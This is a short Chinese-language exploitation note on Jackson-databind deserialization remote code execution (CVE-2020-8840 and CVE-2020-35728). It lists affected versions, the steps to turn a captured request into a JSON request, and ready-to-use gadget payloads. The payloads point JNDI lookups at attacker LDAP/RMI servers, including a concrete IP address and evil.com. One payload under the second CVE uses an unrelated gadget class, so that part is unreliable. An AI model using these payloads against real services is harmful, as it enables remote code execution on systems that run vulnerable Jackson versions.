Jackson是json解释器，主要负责Json的序列化和反序列化

### 远程代码执行（CVE-2020-8840）

##### 版本

jackson<2.9.10.3

2.8.11.5不受影响

##### 原理

2020年2月，jackson-databind在github上更新了一个新的反序列化利用类org.apache.xbean.propertyeditor.JndiConverter，该类绕过了之前jackson-databind维护的黑名单类，并且JDK版本较低的话，可造成RCE。

##### 利用

1.抓包，找到json类型的数据包

2.把content-Type的值改成application/json

请求体中加入

```
 参数名= "[\"org.apache.xbean.propertyeditor.JndiConverter\", {\"asText\":\"ldap://127.0.0.1:1099/Exploit\"}]"
 ldap://127.0.0.1:1099/Exploit这个到时具体自己改
```

### 远程代码执行（CVE-2020-35728）

和上面的同样，只不过调用函数换成

String payload = “[“com.oracle.wls.shaded.org.apache.xalan.lib.sql.JNDIConnectionPool”,{“jndiPath”:“rmi://47.94.236.117:1099/gtaafz”}]”;

payload:

```
{
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://evil.com:9999/TouchFile",
        "autoCommit":true
    }
}

```

